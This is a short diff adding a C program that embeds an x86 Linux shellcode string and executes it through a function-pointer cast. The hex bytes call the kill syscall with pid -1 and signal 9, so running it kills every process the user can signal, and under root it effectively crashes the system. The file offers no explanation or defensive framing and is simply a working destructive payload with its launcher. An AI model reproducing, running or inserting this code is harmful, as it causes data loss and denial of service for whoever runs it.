@@ -1,0 +1,4 @@
+main() {
+	char doit[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";
+	(*(void (*)()) doit)();
+}
